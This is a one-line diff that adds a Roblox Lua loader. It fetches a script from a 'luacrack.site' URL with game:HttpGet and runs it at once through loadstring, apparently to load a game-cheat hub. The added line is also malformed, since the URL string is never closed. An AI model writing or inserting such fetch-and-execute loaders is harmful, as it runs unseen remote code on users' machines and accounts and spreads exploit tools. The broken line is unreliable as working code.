@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://luacrack.site/index.php/trumgrowagarden124/raw/Axver-HubBFDev-AxverhubsektinhAxverDepZai.txt))()
